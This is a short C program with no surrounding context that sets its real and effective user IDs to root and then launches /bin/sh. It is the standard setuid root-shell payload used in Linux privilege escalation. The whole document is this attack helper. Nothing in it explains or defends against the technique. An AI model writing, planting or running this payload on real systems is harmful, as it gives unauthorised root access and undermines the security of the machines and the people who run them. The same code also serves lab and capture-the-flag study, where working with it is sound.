
#include <unistd.h>
#include <stdlib.h>
int main(){
    setreuid(0, 0);
    system("/bin/sh");
    return 0;
}
